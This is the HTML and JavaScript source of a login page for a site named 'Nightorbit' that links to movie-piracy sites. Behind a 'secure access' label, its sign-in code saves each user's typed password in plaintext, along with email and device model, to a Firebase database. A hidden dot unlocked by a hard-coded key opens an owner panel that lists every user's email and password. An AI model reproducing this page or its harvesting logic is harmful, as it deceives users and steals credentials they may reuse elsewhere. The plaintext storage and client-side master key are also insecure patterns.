<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Gyidi Bazar and Cinema.Nightorbit</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        :root { --primary: #00d2ff; --neon: #ff0055; --gold: #ffd700; --bg: #05070a; }
        * { box-sizing: border-box; }
        body { 
            margin: 0; padding: 0; width: 100%; height: 100vh; 
            background: radial-gradient(circle at center, #1B2735 0%, var(--bg) 100%);
            font-family: 'Segoe UI', sans-serif; color: white;
            display: flex; align-items: center; justify-content: center; overflow: hidden;
        }
        .card { 
            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
            padding: 30px; border-radius: 30px; text-align: center; 
            width: 360px; border: 1px solid rgba(255,255,255,0.1); 
            box-shadow: 0 25px 50px rgba(0,0,0,0.8); position: relative; z-index: 10;
        }
        .menu-dots { position: absolute; top: 25px; left: 25px; cursor: pointer; font-size: 30px; color: var(--primary); z-index: 100; opacity: 0.7; }
        .pass-wrapper { position: relative; width: 100%; }
        .pass-wrapper i { position: absolute; right: 15px; top: 22px; cursor: pointer; color: #888; }
        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.4); color: white; outline: none; }
        .btn-main { background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .btn-google { background: white; color: black; border: none; padding: 12px; border-radius: 12px; width: 100%; margin-top: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .link-card { background: rgba(255,255,255,0.07); padding: 12px; border-radius: 15px; margin: 8px 0; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: white; border-left: 4px solid var(--neon); transition: 0.3s; font-size: 13px; }
        #admin-panel { position: fixed; inset: 0; background: #070707; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
        .admin-card { background: #111; padding: 15px; margin-bottom: 15px; border-radius: 15px; border: 1px solid #333; text-align: left; }
        .device-badge { background: #fbbf24; color: #000; padding: 3px 12px; border-radius: 6px; font-size: 12px; font-weight: 900; text-transform: uppercase; display: inline-block; margin-top: 4px; }
        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
        .hidden { display: none !important; }
        .admin-dot { position: absolute; bottom: 15px; right: 15px; cursor: pointer; font-size: 20px; color: #111; z-index: 100; }
    </style>
</head>
<body>

    <div id="logout-overlay">
        <div style="font-size: 60px; margin-bottom: 20px;">ðŸŒ¹</div>
        <div id="bye-text-display" style="color: white; line-height: 1.8; font-size: 18px; max-width: 500px;"></div>
    </div>

    <div id="admin-panel">
        <h1 class="text-2xl font-bold" style="color: var(--primary); margin-bottom: 20px;">Owner Live Logs</h1>
        <button onclick="document.getElementById('admin-panel').style.display='none'" class="btn-main" style="width:auto; padding: 10px 30px; margin-bottom: 20px;">EXIT CONSOLE</button>
        <div id="user-rows-container"></div>
    </div>

    <div class="menu-dots" onclick="bypassLogin()">â‹®</div>
    <div class="admin-dot" onclick="adminAccess()">.</div>

    <div id="login-box" class="card">
        <h1 style="color: var(--primary); margin: 0; font-size: 32px; letter-spacing: 2px; font-weight: 800;">NIGHTORBIT</h1>
        <button class="btn-google" onclick="authGoogle()">
            <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> SIGNUP WITH GOOGLE
        </button>
        <div style="margin: 20px 0; color: #444; font-size: 10px;">â€” SECURE ACCESS â€”</div>
        <input type="email" id="u-email" placeholder="Email Address">
        <div class="pass-wrapper">
            <input type="password" id="u-pass" placeholder="Password (Name + Number)">
            <i class="fa-solid fa-eye" id="togglePass" onclick="togglePassword()"></i>
        </div>
        <button class="btn-main" onclick="authEmail()">Enter Bazaar</button>
    </div>

    <div id="member-area" class="card hidden">
        <h2 id="user-welcome" style="color: var(--primary);">Welcome!</h2>
        <div style="text-align: left; margin-top: 15px;">
            <a href="https://bollyflix.org.in/" target="_blank" class="link-card" style="border-left-color: #00ff00;">ðŸŽ¬ Bollyflix <span>Movies</span></a>
            <a href="https://tamashaweb.com/" target="_blank" class="link-card" style="border-left-color: var(--gold);">ðŸ“º Tamasha App <span>Live TV</span></a>
            <a href="https://vegamovies.to/" target="_blank" class="link-card" style="border-left-color: #ff0055;">ðŸ“¥ Download Movies <span>4K/HD</span></a>
            <a href="https://www.daraz.pk" target="_blank" class="link-card">ðŸ›’ Shopping <span>Daraz</span></a>
            <a href="#" target="_blank" class="link-card" style="border-left-color: #00d2ff;">ðŸŽ¬ Watch & Earn <span>$ Earning</span></a>
        </div>
        <button onclick="logoutSequence()" style="margin-top: 25px; color: #ff4b2b; background: none; border: none; cursor: pointer; text-decoration: underline; font-weight: bold;">Secure Logout</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBxJqJkrAaFf3eR0QWvhet6IvvFVHYExeU",
            authDomain: "my-market-ff254.firebaseapp.com",
            projectId: "my-market-ff254",
            storageBucket: "my-market-ff254.appspot.com",
            messagingSenderId: "1039626785987",
            appId: "1:1039626785987:web:ae5a65a0b16444a2cffe76",
            databaseURL: "https://my-market-ff254-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.database();
        let currentUserName = "";

        // NAYA ADVANCED DEVICE DETECTOR
        function getAdvancedModel() {
            const ua = navigator.userAgent;
            let finalModel = "ANDROID DEVICE";
            if (ua.match(/\(([^)]+)\)/)) {
                let section = ua.match(/\(([^)]+)\)/)[1];
                let parts = section.split(';');
                if(parts.length > 2) {
                    finalModel = parts[parts.length - 1].trim();
                    finalModel = finalModel.split('Build/')[0].split('WV')[0].trim();
                } else {
                    finalModel = parts[0];
                }
            }
            const brands = ["INFINIX", "SAMSUNG", "REALME", "OPPO", "VIVO", "TECNO", "REDMI", "XIAOMI", "IPHONE"];
            let foundBrand = "";
            for(let b of brands) {
                if(ua.toUpperCase().includes(b)) { foundBrand = b + " "; break; }
            }
            return (foundBrand + finalModel).toUpperCase();
        }

        function togglePassword() {
            const p = document.getElementById('u-pass');
            p.type = p.type === "password" ? "text" : "password";
        }

        function authGoogle() {
            const provider = new firebase.auth.GoogleAuthProvider();
            auth.signInWithPopup(provider).then(res => {
                processUser(res.user, "Google Verified", res.user.displayName);
            });
        }

        function authEmail() {
            const e = document.getElementById('u-email').value;
            const p = document.getElementById('u-pass').value;
            if(!e || !p) return alert("Fill fields!");
            auth.signInWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0]))
            .catch(() => auth.createUserWithEmailAndPassword(e, p).then(res => processUser(res.user, p, e.split('@')[0])));
        }

        function processUser(user, pass, realName) {
            currentUserName = realName;
            db.ref('users/' + user.uid).once('value', snap => {
                let data = snap.val();
                let myNick = (data && data.ownerNick) ? data.ownerNick : "New Member";
                db.ref('users/' + user.uid).update({
                    email: user.email,
                    password: pass,
                    device: getAdvancedModel(),
                    realName: realName,
                    ownerNick: myNick,
                    time: new Date().toLocaleString()
                }).then(() => showMemberUI(realName));
            });
        }

        function adminAccess() {
            if (prompt("Admin Key:") === "rr123456789000rr") {
                document.getElementById('admin-panel').style.display = 'block';
                db.ref('users').on('value', (snap) => {
                    let html = "";
                    snap.forEach(c => {
                        let v = c.val();
                        html += `<div class="admin-card">
                            <b style="color:var(--gold)">Nick: ${v.ownerNick}</b><br>
                            <span style="color:var(--primary); font-size:12px;">Gmail: ${v.email}</span><br>
                            <div class="mt-1"><span class="device-badge">${v.device}</span></div>
                            <p style="color:#fff; font-size:11px; margin-top:5px;">Pass: ${v.password}</p>
                            <p style="color:#666; font-size:10px;">Login: ${v.time}</p>
                            <div style="margin-top:10px;">
                                <button onclick="setNick('${c.key}')" style="background:var(--primary); border:none; border-radius:5px; padding:5px 10px; cursor:pointer; font-size:11px; font-weight:bold;">SET NICK</button>
                                <button onclick="if(confirm('Delete?')) firebase.database().ref('users/${c.key}').remove()" style="background:red; color:white; border:none; border-radius:5px; padding:5px 10px; margin-left:10px; cursor:pointer; font-size:11px; font-weight:bold;">REMOVE</button>
                            </div>
                        </div>`;
                    });
                    document.getElementById('user-rows-container').innerHTML = html;
                });
            }
        }

        function setNick(uid) {
            let n = prompt("Enter Nickname (Only for Owner):");
            if(n) db.ref('users/' + uid).update({ ownerNick: n });
        }

        function showMemberUI(name) {
            document.getElementById('login-box').classList.add('hidden');
            document.getElementById('member-area').classList.remove('hidden');
            document.getElementById('user-welcome').innerText = "Hello, " + name;
        }

        function bypassLogin() {
            if (prompt("Master Key:") === "rr123456789000rr") showMemberUI("Owner Farooq");
        }

        function logoutSequence() {
            const overlay = document.getElementById('logout-overlay');
            document.getElementById('bye-text-display').innerHTML = `
                <span style="font-size: 26px; color: var(--gold); font-weight: bold;">Goodbye, ${currentUserName}!</span><br><br>
                It was an absolute pleasure having you at Nightorbit today.<br><br>
                May God bless you with happiness and great success in everything you do. 
                Looking forward to seeing you again very soon!<br><br>
                <i>"Stay safe, stay blessed, and always keep smiling. Allah Hafiz!"</i>
            `;
            overlay.style.display = 'flex';
            setTimeout(() => { location.reload(); }, 6000);
        }
    </script>
</body>
    </html>
    
